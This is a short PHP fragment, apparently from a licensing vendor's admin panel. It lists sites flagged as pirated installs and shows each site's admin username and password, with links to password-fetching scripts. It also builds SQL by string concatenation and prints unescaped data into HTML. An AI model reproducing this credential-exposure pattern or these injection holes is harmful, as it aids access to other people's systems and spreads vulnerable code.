...
$DB->query("insert into `auth_log` (`uid`,`type`,`date`,`city`,`data`) values ('".站长.$user."','查看盗版列表','".$date."','".$city."','".$clientip."')");
?>
<?php
...
echo '<tr><td><a href="../api/jump.php?url='.urlencode('http://'.$res['url'].'/').'" target="_blank">'.$res['url'].'</a>&nbsp;<a href="../api/jump.php?url='.urlencode('http://'.$res['url'].':3312').'" target="_blank"></a></td><td>'.$res['date'].'</td><td>'.$db['admin_user'].'</td><td>'.$db['admin_pass'].'</td><td onclick="alert(\'授权码：'.$res['authcode'].'\')">'.$type.'</td><td><a href="./getpwd.php?url='.$url.'&m=1" class="btn btn-xs btn-primary">基本信息</a>&nbsp;<a href="./getpass.php?url='.$url.'&m=1" class="btn btn-xs btn-primary">基本信息(NEW)</a>&nbsp;<a href="./edit.php?my=delpirate&url='.$res['url'].'" class="btn btn-xs btn-danger" onclick="return confirm(\'你确实要删除此条记录吗？\');">删除</a></td></tr>';
}
?>
          </tbody>
        </table>
